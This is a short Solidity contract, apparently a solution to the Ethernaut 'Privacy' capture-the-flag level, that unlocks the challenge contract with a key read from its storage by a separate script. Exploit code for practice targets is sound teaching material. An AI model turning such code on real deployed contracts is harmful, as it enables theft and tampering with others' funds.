//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IPrivacy {
    function locked() external view returns (bool);

    function unlock(bytes16 _key) external;
}

contract PrivacyExploit {
    IPrivacy public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Privacy` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0xcAac6e4994c2e21C5370528221c226D1076CfDAB
    constructor(IPrivacy _implementation) {
        implementation = _implementation;
    }

    /// @notice Unlock the contract with key gotten in hardhat script
    function exploit(bytes16 _key) external {
        implementation.unlock(_key);
    }

    /// @notice Returns a boolean wheter the `implementation` contract challenge has been unlocked
    /// @return _isExploitComplete Boolean showing the state of `implementation` exploit
    function exploited() external view returns (bool _isExploitComplete) {
        _isExploitComplete = !implementation.locked();
    }
}
